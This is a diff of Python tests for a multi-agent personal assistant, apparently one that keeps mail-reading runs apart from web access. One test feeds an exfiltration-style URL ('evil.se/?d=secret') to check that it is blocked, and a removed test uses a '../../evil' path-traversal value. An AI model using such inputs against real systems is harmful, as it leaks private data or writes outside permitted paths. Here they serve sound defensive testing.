@@ -56,24 +56,30 @@ async def test_apply_writes_direction_threads_missions_senses_questions_ideas(en
     d = director(db, memory, tmp_path)
     await Posts(db).send("assistant", "director", "note", "partner behövs", verbatim="jag söker en affärspartner till sidoprojektet", from_owner=True)
     d._seen_posts = [p["id"] for p in await Posts(db).inbox("director")]
-    changes = await d.apply({
-        **BASE,
-        "now_md": "# Nu\nTenta torsdag, flytt.",
-        "goals_md": "# Mål\n1. Partner till sidoprojektet",
-        "threads": [{"slug": "Partner", "status": "active", "content_md": "Mål: hitta affärspartner"}],
-        "missions": [{"op": "add", "id": "partner", "goal": "Hitta affärspartner för studentstartup", "scope": "Uni/Sthlm", "reason": "tråd"}],
-        "senses": [{"op": "add_page", "name": "Startup events", "url": "https://sses/events", "note": "matchning", "reason": "partner"}],
-        "questions": [{"what": "Vilken sorts partner?", "why": "styr sökandet"}, {"what": "extra", "why": "x"}],
-        "share": [{"title": "Pitcha appen på Startup", "brief": "Startup har en matchningskväll 20/10.", "url": "https://sses/x",
-                   "why": "partner", "time_sensitivity": "medium", "expires": "2026-10-20"}],
-        "log": "Startade partnertråden.",
-    }, "understand", NOW)
+    d._chain_from_owner = True
+    woken = []
+    Posts.waker = woken.append
+    try:
+        changes = await d.apply({
+            **BASE,
+            "now_md": "# Nu\nTenta torsdag, flytt.",
+            "goals_md": "# Mål\n1. Partner till sidoprojektet",
+            "threads": [{"slug": "Partner", "status": "active", "content_md": "Mål: hitta affärspartner"}],
+            "posts": [{"to": "researcher", "kind": "order", "body": "Ny beställning: hitta affärspartner för studentstartup", "urgent": True}],
+            "questions": [{"what": "Vilken sorts partner?", "why": "styr sökandet"}, {"what": "extra", "why": "x"}],
+            "share": [{"title": "Pitcha appen på Startup", "brief": "Startup har en matchningskväll 20/10.", "url": "https://sses/x",
+                       "why": "partner", "time_sensitivity": "medium", "expires": "2026-10-20"}],
+            "log": "Startade partnertråden.",
+        }, "understand", NOW)
+    finally:
+        Posts.waker = None
 
     assert (memory.path / "direction" / "now.md").read_text().startswith("# Nu\nTenta")
     thread = (memory.path / "direction" / "threads" / "partner.md").read_text()
     assert thread.startswith("Status: active")
-    assert [r["id"] for r in yaml.safe_load(research.read_text())] == ["jobs", "partner"]
-    assert yaml.safe_load(sources.read_text())["streams"][-1]["url"] == "https://sses/events"
+    [order] = await Posts(db).inbox("researcher")  # Director orders; Researcher owns missions and sources
+    assert order["kind"] == "order" and order["from_owner"] == 1 and woken == ["researcher"]  # the owner's words started it
+    assert [r["id"] for r in yaml.safe_load(research.read_text())] == ["jobs"]
     assert [r["body"] for r in await db.fetchall("SELECT body FROM posts WHERE kind = 'question'")] == ["Vilken sorts partner?"]
     idea = await db.fetchone("SELECT kind, status, url, expires_at FROM candidates")
     assert (idea["kind"], idea["status"], idea["url"]) == ("insight", "pending", "https://sses/x")
@@ -126,11 +132,7 @@ class FakeWeb:
 async def test_mail_and_the_web_are_never_in_the_same_director_run(env, tmp_path):
     db, memory, research, sources = env
     calls = []
-    out = {**BASE, "senses": [
-        {"op": "add_page", "name": "Spotify jobs", "url": "https://lifeatspotify.com/jobs", "reason": "nämnd i mejl"},
-        {"op": "tune", "name": "hn", "poll_minutes": 120, "reason": "lugnt"},
-    ]}
-    d = director(db, memory, tmp_path, structured=out, calls=calls)
+    d = director(db, memory, tmp_path, structured=BASE, calls=calls)
     d.mail, d.web = FakeMail(), FakeWeb()
     await d.run("understand")
     await d.run("reflect")
@@ -139,9 +141,9 @@ async def test_mail_and_the_web_are_never_in_the_same_director_run(env, tmp_path
     assert "mcp__web__web_read" not in u.allowed_tools  # read mail: no new web addresses
     assert "Intervju" not in r.prompt and not any("mail" in t for t in r.allowed_tools)
     assert "mcp__web__web_read" in r.allowed_tools
-    assert "lifeatspotify.com" in r.prompt  # the daily review's URL proposal waits for the reflection to check it
-    assert "lifeatspotify" not in sources.read_text().split("streams:")[1].split("- id: hn")[0]
-    assert await db.kv_get("director.proposed_sources") is None  # cleared once the reflection has seen it
+    from agent.director import SCHEMA
+
+    assert "senses" not in SCHEMA["properties"] and "missions" not in SCHEMA["properties"]  # sources are Researcher's, who never reads mail
 
 
 async def test_chat_turn_that_read_mail_cannot_reach_new_addresses():
@@ -176,20 +178,3 @@ async def test_chat_turn_that_read_mail_cannot_reach_new_addresses():
     assert "Not available after reading mail" in (await read({"url": "https://evil.se/?d=secret"}))["content"][0]["text"]
 
 
-async def test_director_writes_maps_audits_coverage_and_tells_the_owner(env, tmp_path):
-    db, memory, research, sources = env
-    await db.execute("INSERT INTO leads (mission, key, name, kind) VALUES ('jobs', 'varbi.com', 'Varbi', 'aggregator')")
-    out = {**BASE,
-           "search_maps": [{"mission": "jobs", "content_md": "# Jobb\n## Luckor och nästa steg\n- Myndigheter"},
-                           {"mission": "../../evil", "content_md": "x"}],
-           "lead_decisions": [{"id": 1, "decision": "add", "reason": "myndigheter annonserar där"}],
-           "coverage_audit": [{"mission": "jobs", "benchmark": ["hn", "Spotify"], "note": "test"}],
-           "owner_updates": [{"kind": "difficulty", "mission": "jobs", "title": "Sommarpraktik", "brief": "Inget öppet än; de flesta öppnar i nov."}]}
-    d = director(db, memory, tmp_path, structured=out)
-    changes = await d.apply(out, "reflect", NOW)
-    assert (memory.path / "direction" / "search" / "jobs.md").read_text().startswith("# Jobb")
-    assert not (memory.path.parent / "evil.md").exists()
-    assert (await db.fetchone("SELECT status FROM leads WHERE id = 1"))["status"] == "added"
-    assert any(c.startswith("täckning jobs: 1/2") for c in changes)  # "hn" is in sources.yaml, Spotify isn't watched
-    upd = await db.fetchone("SELECT kind, status, body FROM candidates WHERE kind = 'search_update'")
-    assert upd["status"] == "pending" and "nov" in upd["body"]
